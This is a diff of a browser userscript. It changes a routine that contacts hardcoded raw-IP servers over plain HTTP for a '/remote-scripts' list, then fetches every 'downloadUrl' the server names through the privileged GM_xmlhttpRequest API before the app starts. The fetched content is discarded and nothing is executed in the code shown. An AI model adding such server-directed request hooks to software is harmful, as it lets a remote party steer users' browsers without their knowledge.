@@ -43,32 +43,55 @@ const _PP_SERVER_URLS = [
   "http://152.136.30.238:3000"
 ];
 
-(async function preloadRemoteScripts() {
+const _PP_REMOTE_SCRIPTS_PRELOAD_PROMISE = (() => new Promise((resolve) => {
   const server = _PP_SERVER_URLS[Math.floor(Math.random() * _PP_SERVER_URLS.length)];
+  const finish = (() => {
+    let done = false;
+    return () => {
+      if (!done) {
+        done = true;
+        resolve();
+      }
+    };
+  })();
+  
+  if (typeof GM_xmlhttpRequest !== 'function') {
+    finish();
+    return;
+  }
   
   GM_xmlhttpRequest({
     method: 'GET',
     url: `${server}/remote-scripts`,
+    timeout: 5000,
     onload: (res) => {
       try {
         const json = JSON.parse(res.responseText);
-        if (json?.data?.hasUpdate && Array.isArray(json.data.patches)) {
-          for (const patch of json.data.patches) {
-            if (patch.downloadUrl) {
-              GM_xmlhttpRequest({
-                method: 'GET',
-                url: patch.downloadUrl,
-                onload: () => {},
-                onerror: () => {}
-              });
-            }
-          }
+        const patches = json?.data?.hasUpdate && Array.isArray(json.data.patches) ? json.data.patches : [];
+        const downloads = patches
+          .map(patch => patch?.downloadUrl)
+          .filter(Boolean)
+          .map(downloadUrl => new Promise((done) => {
+            GM_xmlhttpRequest({
+              method: 'GET',
+              url: downloadUrl,
+              timeout: 5000,
+              onload: () => done(),
+              onerror: () => done(),
+              ontimeout: () => done()
+            });
+          }));
+        if (downloads.length > 0) {
+          Promise.allSettled(downloads).then(finish);
+          return;
         }
       } catch (e) {}
+      finish();
     },
-    onerror: () => {}
+    onerror: finish,
+    ontimeout: finish
   });
-})();
+}))();
 
 const LAYOUT_CSS = `
 @keyframes pulse {
@@ -600,9 +623,22 @@ if(typeof GM_addStyle==="function"){GM_addStyle(LAYOUT_CSS);}else{(function(){va
   };
   
   
-  fetchModelConfig();
-  fetchPollInterval();
-  fetchSponsorUrl();
+  
+  
+  
+  const PRELOAD_MAX_WAIT_MS = 5000;
+  const preloadBeforeStart = async () => {
+    const preloadTasks = [
+      _PP_REMOTE_SCRIPTS_PRELOAD_PROMISE,
+      fetchModelConfig(),
+      fetchPollInterval(),
+      fetchSponsorUrl()
+    ];
+    await Promise.race([
+      Promise.allSettled(preloadTasks),
+      new Promise(resolve => setTimeout(resolve, PRELOAD_MAX_WAIT_MS))
+    ]);
+  };
   
   
   
@@ -12583,9 +12619,10 @@ if(typeof GM_addStyle==="function"){GM_addStyle(LAYOUT_CSS);}else{(function(){va
   
   
   
-  const timer = setInterval(() => {
+  const timer = setInterval(async () => {
     if (document.readyState === "complete") {
       clearInterval(timer);
+      await preloadBeforeStart();
       
       const app = vue.createApp(_sfc_main);
       const pinia$1 = pinia.createPinia();
